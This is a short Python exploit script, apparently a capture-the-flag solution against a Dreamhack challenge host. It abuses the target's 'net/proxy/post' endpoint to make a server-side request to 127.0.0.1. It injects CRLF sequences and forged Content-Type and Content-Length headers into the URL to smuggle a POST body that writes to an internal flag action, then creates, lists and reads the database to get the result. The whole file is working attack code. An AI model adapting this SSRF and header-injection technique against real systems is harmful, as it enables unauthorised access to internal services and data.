import requests
from urllib.parse import quote

class Exploit:
    def __init__(self, baseURL, key="foobar", dbkey="foobar"):
        self.baseURL = baseURL
        self.key = key
        self.dbkey = dbkey
        self.session = requests.Session()
    
    def create_db(self):
        param = {
            "action": "db/create",
            "key": self.key
        }
        response = self.session.get(self.baseURL, params=param)
        print(response.text)
    
    def send_proxy(self):
        content = f"mode=write&dbkey={self.dbkey}&key={self.key}"
        header = (
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(content)}"
        )
        payload = f"\r\n{header}\r\n\r\n{content}"
        response = self.session.get(
            f"{self.baseURL}/?action=net/proxy/post&url=127.0.0.1/?action=flag/flag&" + quote(payload)
        )
        print(response.text)
    
    def list_db(self):
        response = self.session.get(self.baseURL, params={"action": "db/list"})
        print(response.text)
    
    def read_db(self):
        response = self.session.get(self.baseURL, params={
            "action": "db/read",
            "dbkey": self.dbkey,
            "key": self.key
        })
        print(response.text)

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:13318"
    exploit = Exploit(BASE_URL)

    print(f"[+] Create Table")
    exploit.create_db()

    print("[+] Proxy Post Exploit")
    exploit.send_proxy()

    print(f"[+] List Database")
    exploit.list_db()

    print(f"[+] Read Database")
    exploit.read_db()